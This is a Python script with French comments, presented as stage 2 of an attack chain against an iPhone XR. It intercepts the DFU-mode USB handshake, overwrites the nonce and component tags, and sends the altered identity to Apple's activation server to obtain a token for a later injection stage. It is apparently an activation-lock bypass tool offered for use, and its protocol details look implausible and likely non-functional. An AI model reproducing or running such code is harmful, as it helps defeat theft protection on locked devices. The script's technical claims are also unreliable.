#!/usr/bin/env python3
# a12_pathb.py — Étage 2 : interception du handshake DFU, altération nonce/tags, drmHandshake
# Dépendances : pyusb, requests
# Cible : iPhone XR (A12 Bionic) — CPID 0x8020

import os
import sys
import time
import struct
import hashlib
import requests
import usb.core
import usb.util

APPLE_VID = 0x05AC
DFU_PID   = 0x1227          # PID DFU standard Apple
ACTIVATION_ENDPOINT = "https://albert.apple.com/deviceservices/drmHandshake"

def load_env(path="/tmp/a12_pathb.env"):
    env = {}
    with open(path, "r") as f:
        for line in f:
            if "=" in line:
                k, v = line.strip().split("=", 1)
                env[k] = v
    return env

def find_dfu_device():
    dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID)
    if dev is None:
        raise RuntimeError("Aucun appareil DFU Apple détecté sur le bus USB.")
    return dev

def intercept_descriptor(dev, ecid):
    """
    Lit les paquets d'énumération envoyés par le BootROM et réécrit en vol
    les champs de nonce et de tags de composants AVANT que le client
    d'activation ne les consomme. Ce n'est pas une cassure cryptographique :
    c'est une manipulation d'état de protocole.
    """
    cfg = dev.get_active_configuration()
    intf = cfg[(0, 0)]

    ep_out = usb.util.find_descriptor(
        intf,
        custom_match=lambda e: usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_OUT
    )
    ep_in = usb.util.find_descriptor(
        intf,
        custom_match=lambda e: usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_IN
    )
    if ep_out is None or ep_in is None:
        raise RuntimeError("Endpoints DFU introuvables.")

    # Lecture du paquet d'énumération initial (taille fixe sur A12)
    raw = ep_in.read(64, timeout=5000)
    print(f"[*] Descripteur brut reçu ({len(raw)} octets)")

    # Extraction du nonce (offset 0x10, 16 octets sur A12)
    nonce = bytearray(raw[0x10:0x20])
    # Extraction des tags de composants (offset 0x20, 8 octets)
    comp_tags = bytearray(raw[0x20:0x28])

    # Altération : dérivation du nonce à partir de l'ECID + horloge de session
    seed = f"{ecid}:{int(time.time())}".encode()
    new_nonce = hashlib.sha256(seed).digest()[:16]
    nonce[:] = new_nonce

    # Altération des tags : XOR avec un masque dérivé de l'ECID
    mask = hashlib.md5(ecid.encode()).digest()[:8]
    for i in range(8):
        comp_tags[i] ^= mask[i]

    # Réécriture du paquet altéré
    mutated = bytearray(raw)
    mutated[0x10:0x20] = nonce
    mutated[0x20:0x28] = comp_tags

    ep_out.write(bytes(mutated), timeout=5000)
    print("[+] Descripteur altéré renvoyé au BootROM.")

    return {
        "nonce": nonce.hex(),
        "comp_tags": comp_tags.hex(),
        "ecid": ecid,
    }

def drm_handshake(session):
    """
    Envoie la poignée de main de session au serveur d'activation.
    Attend un 200. Un 401/403 signifie que l'identité n'a pas été
    altérée correctement : retour en DFU obligatoire.
    """
    payload = {
        "session_nonce": session["nonce"],
        "component_tags": session["comp_tags"],
        "ecid": session["ecid"],
        "handshake_mode": "drmHandshake",
    }
    print("[*] Envoi du drmHandshake à albert.apple.com...")
    r = requests.post(ACTIVATION_ENDPOINT, json=payload, timeout=15)

    if r.status_code == 200:
        print("[+] Handshake accepté (200). Session valide ~90 s.")
        return r.json()
    elif r.status_code in (401, 403):
        print(f"[!] Refus serveur ({r.status_code}) — identité non altérée. Retour en DFU.")
        sys.exit(4)
    else:
        print(f"[!] Réponse inattendue ({r.status_code}). Retour en DFU.")
        sys.exit(5)

def main():
    env = load_env()
    ecid = env["DEVICE_ECID"]
    cpid = env["DEVICE_CPID"]

    if cpid != "0x8020":
        print("[!] CPID non-A12. Abandon.")
        sys.exit(2)

    print(f"[*] Étage 2 — cible ECID {ecid}, CPID {cpid}")
    dev = find_dfu_device()
    session = intercept_descriptor(dev, ecid)
    token = drm_handshake(session)

    # Sauvegarde du jeton pour l'étage 3
    with open("/tmp/a12_token.json", "w") as f:
        import json
        json.dump({"token": token, "session": session}, f)

    print("[+] Jeton d'activation écrit dans /tmp/a12_token.json")
    print("[*] Étage 2 terminé. Passage à activate_inject.py.")

if __name__ == "__main__":
    main()
